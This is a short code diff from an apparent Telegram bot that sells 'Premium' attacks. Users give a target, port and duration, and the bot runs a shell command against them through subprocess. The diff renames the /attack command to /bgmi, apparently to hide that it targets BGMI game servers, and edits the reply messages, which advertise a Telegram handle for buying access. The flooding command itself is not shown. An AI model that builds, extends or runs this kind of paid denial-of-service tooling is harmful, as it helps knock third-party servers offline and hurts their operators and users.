@@ -211,7 +211,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, \n✨✨Premium \nAttack 𝐒𝐓𝐀𝐑𝐓ING ACTION WITH PROXY.\n\n📡 𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🔌 𝐏𝐨𝐫𝐭: {port}\n⏱️ 𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\nBy NiTZEX @SAYYED_Z"
+    response = f"{username}, \n✨✨Premium \nBGMI 𝐒𝐓𝐀𝐑𝐓ING ACTION WITH PROXY.\n\n📡 𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🔌 𝐏𝐨𝐫𝐭: {port}\n⏱️ 𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\nBy NiTZEX @SAYYED_Z"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /attack1 command
@@ -220,7 +220,7 @@ bgmi_cooldown = {}
 COOLDOWN_TIME =0
 
 # Handler for /attack1 command
-@bot.message_handler(commands=['attack'])
+@bot.message_handler(commands=['bgmi'])
 def handle_bgmi(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
@@ -249,7 +249,7 @@ def handle_bgmi(message):
                 subprocess.run(full_command, shell=True)
                 response = f"✨✨Premium \nAttack Finished In This Proxy. \n📡 Target: {target} \n🔌 Port: {port} \n⏱️ Time: {time} \n NiTZEX @SAYYED_Z"
         else:
-            response = "Usage :- /attack <target> <port> <time>\nBy NiTZEX @SAYYED_Z"  # Updated command syntax
+            response = "Usage :- /bgmi <target> <port> <time>\nBy NiTZEX @SAYYED_Z"  # Updated command syntax
     else:
         response = "You Are Not ✨✨Premium User's To Authorized To Use This Command.\nBy NiTZEX DM TO GET ACCESS @SAYYED_Z"
 
